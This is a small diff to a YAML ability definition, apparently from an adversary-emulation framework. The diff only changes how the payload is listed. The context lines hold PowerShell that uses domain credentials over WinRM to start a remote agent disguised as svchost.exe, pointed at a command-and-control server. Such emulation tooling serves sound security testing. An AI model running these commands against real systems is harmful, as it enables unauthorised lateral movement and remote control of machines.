@@ -1,6 +1,3 @@
-
----
-
 - id: 41bb2b7a-75af-49fd-bd15-6c827df25921
   name: Start Agent (WinRM)
   description: Start Agent using WinRM (WinRM)
@@ -21,7 +18,6 @@
           Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server #{server} -executors psh}};
           Start-Sleep -s 5;
           Remove-PSSession -Session $session;
-        payload: sandcat.go-windows
         cleanup: |
           $username = "#{domain.user.name}";
           $password = "#{domain.user.password}";
@@ -32,3 +28,5 @@
           Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\Users\Public\svchost.exe | Stop-Process}};
           Start-Sleep -s 5;
           Remove-PSSession -Session $session;
+        payloads:
+        - sandcat.go-windows
